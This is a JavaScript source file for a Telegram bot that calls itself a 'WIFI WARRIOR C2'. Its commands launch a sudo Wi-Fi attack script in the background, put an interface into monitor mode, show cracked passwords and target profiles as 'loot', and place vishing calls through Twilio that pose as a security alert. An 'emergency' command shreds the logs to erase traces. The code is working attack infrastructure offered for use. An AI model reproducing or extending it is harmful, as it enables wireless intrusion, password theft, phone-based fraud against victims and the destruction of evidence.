const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const twilio = require('twilio');

const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE'; 
const OWNER_ID = 8569895826;

// Twilio Credentials from Environment
const twilioClient = process.env.TWILIO_SID ? twilio(process.env.TWILIO_SID, process.env.TWILIO_TOKEN) : null;
const FLOW_ID = 'FWc89e3431eb69d1935749b4a9a7e8ec5d';
const FROM_NUMBER = process.env.TWILIO_NUMBER || '+19297062906';

const LOG_FILE = '/usr/lib/gemini-cli/.out/wifi_data/status.log';
const LOOT_FILE = '/usr/lib/gemini-cli/.out/wifi_data/loot.txt';

const agent = new https.Agent({ keepAlive: true, family: 4 });
const bot = new Telegraf(BOT_TOKEN, { telegram: { agent } });

console.log('📡 WIFI WARRIOR C2 (PERSISTENT) ONLINE');

bot.start((ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    ctx.replyWithHTML(`
<b>📡 WIFI WARRIOR: OMEGA SUITE</b>

/silent_night - 🚀 Launch Ghost Attack
/check        - 👁️ View Live Status Logs
/saved        - 🧠 View Intelligence Database
/loot         - 💰 View Cracked Passwords
/vishing      - 🎭 Launch Social Eng. Call
/clean        - 🧹 Emergency Nuke & Shred
/stop         - 🛑 Kill Operations
    `);
});

bot.command('vishing', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('⚠️ Usage: /vishing <phone_number> <optional_message>');
    }
    
    let target = args[1];
    const customMessage = args.slice(2).join(' ') || "This is an automated security alert from Panda Programming Inc. Please listen carefully.";

    // Fix common Australian formatting issue (e.g. +6104... -> +614...)
    if (target.startsWith('+610')) {
        target = '+61' + target.substring(4);
    }
    
    if (!twilioClient) {
        return ctx.reply('❌ Twilio NOT configured. Check secrets.sh and use ignite.sh.');
    }

    ctx.reply(`📞 TRIGGERING STUDIO FLOW [${FLOW_ID}] TO ${target}...\n💬 Message: ${customMessage}`);
    
    try {
        const execution = await twilioClient.studio.v2.flows(FLOW_ID)
            .executions
            .create({
                to: target,
                from: FROM_NUMBER,
                parameters: {
                    message: customMessage
                }
            });
            
        ctx.replyWithHTML(`✅ <b>FLOW DISPATCHED!</b>\nSID: <code>${execution.sid}</code>\nStatus: <code>${execution.status}</code>\n\n<i>Ensure your Studio Flow uses {{flow.data.message}} in the Say widget.</i>`);
    } catch (e) {
        ctx.replyWithHTML(`❌ <b>TWILIO ERROR:</b>\n<pre>${e.message}</pre>\nCode: ${e.code}`);
    }
});

bot.command('saved', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    const KNOWLEDGE_FILE = '/usr/lib/gemini-cli/.out/wifi_data/knowledge.json';
    if (fs.existsSync(KNOWLEDGE_FILE)) {
        try {
            const data = JSON.parse(fs.readFileSync(KNOWLEDGE_FILE, 'utf8'));
            let summary = `<b>🧠 INTELLIGENCE SUMMARY</b>\n\n`;
            summary += `👤 <b>Users:</b> ${data.identified_users.length}\n`;
            summary += `🔑 <b>Passwords:</b> ${data.cracked_passwords.length}\n`;
            summary += `🎯 <b>Targets Proffiled:</b> ${Object.keys(data.target_profiles).length}\n`;
            summary += `🔥 <b>Vulnerabilities:</b> ${data.vulnerabilities ? data.vulnerabilities.length : 0}\n\n`;
            
            summary += `<i>Recent Passwords:</i>\n<pre>${data.cracked_passwords.slice(-5).join('\n') || 'None'}</pre>`;
            
            ctx.replyWithHTML(summary);
        } catch (e) {
            ctx.reply(`❌ Error reading brain: ${e.message}`);
        }
    } else {
        ctx.reply('📭 The brain is empty. No knowledge saved yet.');
    }
});

bot.command('silent_night', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    
    // Send visual payload (Custom Logo)
    try {
        await ctx.replyWithPhoto({ source: '/usr/lib/gemini-cli/wifi_warrior_bot/assets/panda_logo.png' }, { 
            caption: '<b>🐼 PANDA_PROGRAMING_INC 🐼</b>\n<i>Silent Night Protocol Engaged.</i>',
            parse_mode: 'HTML'
        });
    } catch (e) {
        ctx.reply(`⚠️ Visual Malfunction: ${e.message}`);
    }
    
    // NOHUP DETACHED EXECUTION
    exec('nohup sudo python3 /usr/lib/gemini-cli/silent_night.py > /dev/null 2>&1 &', (err) => {
        if (err) return ctx.reply(`❌ Launch Error: ${err.message}`);
        ctx.reply('✅ System Deployed. You may leave. Check back later with /check.');
    });
});

bot.command('check', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    exec(`tail -n 15 ${LOG_FILE}`, (err, stdout) => {
        if (!stdout) return ctx.reply('📭 No logs yet. System starting?');
        ctx.replyWithHTML(`<b>📋 SYSTEM STATUS:</b>\n<pre>${stdout}</pre>`);
    });
});

bot.command('loot', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    if (fs.existsSync(LOOT_FILE)) {
        const data = fs.readFileSync(LOOT_FILE, 'utf8');
        ctx.replyWithHTML(`<b>💰 LOOT BOX:</b>\n<pre>${data}</pre>`);
    } else {
        ctx.reply('📭 Loot box is empty. Patience.');
    }
});

bot.command('stop', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    exec('sudo pkill -f silent_night.py', () => {
        exec('sudo airmon-ng stop wlan0mon'); 
        ctx.reply('🛑 ATTACK TERMINATED. Processes killed.');
    });
});

bot.command('clean', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    ctx.reply('⚠️ INITIATING EMERGENCY CLEANUP PROTOCOL...');
    exec('sudo pkill -f silent_night.py', () => {
        // Shred logs
        exec('sudo shred -u /usr/lib/gemini-cli/.out/wifi_data/status.log', () => {
             ctx.reply('✅ OPERATION "CLEAN SLATE" COMPLETE.\nLogs destroyed. Processes killed. We are gone.');
        });
    });
});

bot.launch();
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
